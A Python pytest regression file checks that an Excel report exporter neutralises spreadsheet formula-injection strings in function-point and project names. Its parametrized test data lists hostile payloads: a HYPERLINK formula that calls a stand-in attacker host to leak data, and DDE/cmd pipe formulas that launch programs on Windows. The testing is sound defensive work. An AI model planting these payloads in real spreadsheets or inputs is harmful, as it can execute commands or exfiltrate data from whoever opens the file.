"""ISSUE-023 regression: Excel/CSV formula injection guard.

Round 5 QA found that a function-point name like '=HYPERLINK(...)' got written
to a cell with data_type='f' — Excel interprets it as a formula and runs it
when the user opens the file. Other classic vectors: '=cmd|...!A1' (RCE on
Windows), '+CMD', '@SUM', leading TAB/CR. The fix in exporters/excel._safe_text
prefixes any such string with a single quote so Excel forces text mode.
"""
from io import BytesIO
from pathlib import Path

import pytest
from openpyxl import load_workbook

H = {"X-Auth-Token": "test-secret-token-xyz", "Origin": "http://127.0.0.1:8788"}
FIX = Path(__file__).parent.parent / "fixtures"


async def _make_project_with_evil_fp(client, fp_name: str) -> str:
    rp = await client.post("/api/projects", headers=H, json={
        "name": "T", "project_type": "dev_only", "phase": "bidding",
        "city": "北京", "industry": "电子政务", "mode": "forward",
        "basis_data_ver": "CSBMK®-202510",
    })
    pid = rp.json()["data"]["id"]
    await client.post(
        f"/api/projects/{pid}/functions/bulk",
        headers={**H, "Content-Type": "application/json"},
        json={"items": [{"name": fp_name, "category": "EI", "complexity": "low",
                          "ufp": 3, "us": 3, "source": "manual"}]},
    )
    return pid


async def _download_xlsx(client, pid: str):
    r = await client.get(f"/api/reports/excel/{pid}", headers=H)
    assert r.status_code == 200, r.text
    return load_workbook(BytesIO(r.content))


@pytest.mark.parametrize("evil", [
    '=HYPERLINK("http://attacker.example/leak","click")',
    '=cmd|"/c calc"!A0',
    '+SUM(1+1)',
    '-2+3+cmd|"calc"',
    '@SUM(1+1)',
    '\t=DDE("cmd","/c calc","")',
])
async def test_evil_fp_name_does_not_become_formula(client_factory, tmp_data_dir, evil):
    async with await client_factory() as client:
        pid = await _make_project_with_evil_fp(client, evil)
        wb = await _download_xlsx(client, pid)
        ws = wb["功能点计数表"]
        # name 在第 6 列（i=2 行第一条）
        cell = ws.cell(2, 6)
        assert cell.data_type != "f", (
            f"FP name {evil!r} was written as Excel FORMULA "
            f"(data_type=f, value={cell.value!r}) — formula injection guard broken"
        )
        # 单引号前缀让原文可见但不执行
        assert isinstance(cell.value, str)
        assert cell.value.startswith("'") or cell.value.startswith(evil[0])


async def test_normal_fp_name_unchanged(client_factory, tmp_data_dir):
    """非公式串不受影响。"""
    async with await client_factory() as client:
        pid = await _make_project_with_evil_fp(client, "用户登录")
        wb = await _download_xlsx(client, pid)
        ws = wb["功能点计数表"]
        cell = ws.cell(2, 6)
        assert cell.value == "用户登录"
        assert cell.data_type != "f"


async def test_evil_project_name_in_cover_sheet(client_factory, tmp_data_dir):
    """A3 「项目名称：xxx」形式：因为前缀已经是中文文字，xxx 即使是 = 开头也
    不会触发，但 _safe_text 仍然包了一层做纵深防御 — 测试结果即「不当公式」。"""
    async with await client_factory() as client:
        rp = await client.post("/api/projects", headers=H, json={
            "name": "=evil-name-here", "project_type": "dev_only", "phase": "bidding",
            "city": "北京", "industry": "电子政务", "mode": "forward",
            "basis_data_ver": "CSBMK®-202510",
        })
        pid = rp.json()["data"]["id"]
        await client.post(
            f"/api/projects/{pid}/functions/bulk",
            headers={**H, "Content-Type": "application/json"},
            json={"items": [{"name": "x", "category": "EI", "complexity": "low",
                              "ufp": 3, "us": 3, "source": "manual"}]},
        )
        wb = await _download_xlsx(client, pid)
        cover = wb["封面声明"]
        a3 = cover["A3"]
        assert a3.data_type != "f"
